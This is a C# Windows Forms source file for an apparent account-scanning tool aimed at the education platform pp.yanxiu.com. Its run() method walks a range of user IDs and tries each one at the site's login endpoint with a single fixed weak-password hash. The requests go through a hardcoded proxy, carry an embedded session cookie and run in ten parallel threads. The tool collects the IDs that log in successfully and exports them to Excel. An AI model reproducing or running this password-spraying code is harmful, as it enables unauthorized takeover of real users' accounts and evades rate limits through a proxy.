using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using helper;

namespace 常用软件非客户
{
    public partial class 研修网扫号 : Form
    {
        public 研修网扫号()
        {
            InitializeComponent();
        }
        string IP = "115.230.68.46:47113";

        #region GET使用代理IP请求
        /// <summary>
        /// GET请求
        /// </summary>
        /// <param name="Url">网址</param>
        /// <returns></returns>
        public static string GetUrlwithIP(string Url, string ip)
        {
            try
            {

                string COOKIE = "TP=228680536745; Hm_lvt_2d1b250bf584f0548a352c7cc60162e6=1591952183; Hm_lvt_069bc284e628b8fbe63078e283242a43=1592025285,1592025300,1592025378,1592025687; Hm_lvt_b03f608d53342c4f99acb1ce5a400930=1596701123,1596709130,1596785304,1596860525; weakLoginName=13537696; Hm_lpvt_b03f608d53342c4f99acb1ce5a400930=1596860599; pptmpuserid=XY04184804@yanxiu.com";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);  //创建一个链接
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
                WebProxy proxy = new WebProxy(ip);
                request.Proxy = proxy;

                request.AllowAutoRedirect = true;
                request.Headers.Add("Cookie", COOKIE);
                request.KeepAlive = true;
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                request.Timeout = 8000;
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8")); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO

                string content = reader.ReadToEnd();
                reader.Close();
                response.Close();
                return content;

            }
            catch (System.Exception ex)
            {
                ex.ToString();

            }
            return "";
        }
        #endregion

        ArrayList lists = new ArrayList();
        public void run()
        {
            for (long i = Convert.ToInt64(textBox1.Text); i < Convert.ToInt64(textBox2.Text); i++)
            {
                if (!lists.Contains(i))
                {
                    lists.Add(i);
                    string url = "http://pp.yanxiu.com/sso/loginNew.jsp?callback=jQuery110207211052624197256_1592025714422&userid=" + i + "&appid=f6de93f8-c589-4aa7-9eb1-92f4afb4aea5&password=e10adc3949ba59abbe56e057f20f883e";
                    string html = GetUrlwithIP(url, IP);

                    Match status = Regex.Match(html, @"login_status"":([\s\S]*?),");
                    if (status.Groups[1].Value == "0")
                    {
                        ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count + 1).ToString()); //使用Listview展示数据    
                        lv1.SubItems.Add(i.ToString());
                    }
                    label3.Text = i.ToString();
                }
            }

        }
        private void button1_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < 10; i++)
            {
                Thread thread = new Thread(new ThreadStart(run));
                Control.CheckForIllegalCrossThreadCalls = false;
                thread.Start();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
        }

        private void 研修网扫号_Load(object sender, EventArgs e)
        {

        }
    }
}
